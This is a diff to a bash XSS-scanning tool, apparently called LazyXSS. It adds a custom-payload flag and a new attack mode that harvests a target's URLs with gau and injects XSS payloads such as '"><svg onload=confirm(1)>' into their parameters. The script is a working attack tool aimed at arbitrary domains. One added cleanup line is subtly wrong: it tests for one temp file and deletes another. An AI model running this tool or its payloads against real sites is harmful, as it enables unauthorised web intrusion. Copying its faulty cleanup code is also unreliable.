@@ -5,12 +5,13 @@ export PATH="$PATH:~/.LazyXSS:~/.LazyXSS/airixss:~/.LazyXSS/httprobe:~/.LazyXSS/
 
 # flags
 
-while getopts a:t:p:h flag
+while getopts a:t:p:x:h flag
 do
     case "${flag}" in
         a) attack=${OPTARG};;
         t) target=${OPTARG};;
         p) ports=${OPTARG};;
+        x) custom=${OPTARG};;
         h) help=${OPT};;
         *) echo "Invalid option: -$flag" ;;
     esac
@@ -24,6 +25,7 @@ trap ctrl_c INT
 function rm_tmp () {
 
  if [ -f /tmp/probes.tmp ];then rm -f /tmp/probes.tmp;fi
+ if [ -f /tmp/probes.tmp ];then rm -f /tmp/gau.tmp;fi
  if [ -f /tmp/url-path.tmp ];then rm -f /tmp/url-path.tmp;fi
 
 }
@@ -36,8 +38,18 @@ function ctrl_c(){
 
 ## VARS
 probe_temp="/tmp/probes.tmp"
+gau_temp="/tmp/gau.tmp"
+
+if [ "$custom" ]
+then
+	xss_payload=$custom
+	reflect=$custom
+else 
 xss_payload='"><svg onload=confirm(1)>'
 reflect="confirm(1)"
+
+fi
+
 
 ## Colors
 end="\033[0m\e[0m"
@@ -70,8 +82,9 @@ echo -e "${purple}
   ░ ░    ░   ▒   ░ ░ ░ ░ ░ ▒ ▒ ░░   ░    ░  ░  ░  ░  ░  ░  ░  
     ░  ░     ░  ░  ░ ░     ░ ░      ░    ░        ░        ░  
                  ░         ░ ░                                
-${end}
+
 By Filiplain
+${end}
 "
 
 
@@ -84,20 +97,24 @@ function help_panel () {
 
 echo -e "
 
-  -a)	  Set attack number (1,2,3):
+  -a)	  Set attack number (1,2,3,4):
           1) Try finding XSS in parameters on Given URL or list of URLs in a File.
           2) Try finding XSS in PATHs on Given URL or list of URLs in a File.
           3) Probe given domain or domains in a file, Crawls the alive URLs and then try to find possible XSS on Parameters.
           eg: -a 3
-        
+          4) Fetch URLs of target domain and try to find possible XSS on Parameters.
+          eg: -a 4
         
   -t)     Set target giving a URL/domain or a list in a file depending on the attack type. 
  	  eg: -t ./url-list.txt
  	  eg: -t http://vulnpage.test
  	
  	
-  -p)     Set ports to probe (defaults 80,443).
+  -p)     [When using attack #3 only] Set ports to probe (defaults 80,443).
 	  eg: -p 8000,8080,8085,10443
+
+  -x)	  [OPTIONAL] Custom XSS Payload (Default: '\"><svg onload=confirm(1)>)'
+          eg: -x '\"><sCrIpT>alert(1)<ScRiPt>'
 
   -h)	  Open this help panel
 
@@ -165,6 +182,16 @@ function target_func () {
 
 }
 
+## Fetching all target URLs
+
+function getallurls () {
+
+gau $(target_func) > $gau_temp
+echo -e "${yellow} $(wc -l /tmp/gau.tmp|cut -f 1 -d ' ') URLs Found${end}\n"
+target=$gau_temp
+echo -e "${blue}Finding XSS on fetched URLs${end}"
+xss_find2
+}
 
 ## probing with domais and ports
 function probes () { 
@@ -260,7 +287,14 @@ if [ $1 == '-h' ];then
   help_panel
 else
 if [ $1 ];then 
- if [ $attack == "3" ]
+ if [ $attack == "4" ]
+  then
+   echo -e "The attack type selected was ${red}#$attack${end}:\n"
+   echo "Fetching all URLs of the target and then finding XSS on Parameters (=)"
+    echo -e "\n${yellow}[This could take a lot of time depending on the target]${end}\n"
+   getallurls
+
+ elif [ $attack == "3" ]
   then
    echo -e "The attack type selected was ${red}#$attack${end}:\n"
    echo "Probing, Crawling and Testing for XSS on given domains"
@@ -302,6 +336,3 @@ fi
 fi
 echo -e "\n\n\n${red}Made${end} in ${blue}Do${end}"
 rm_tmp
-
-
-
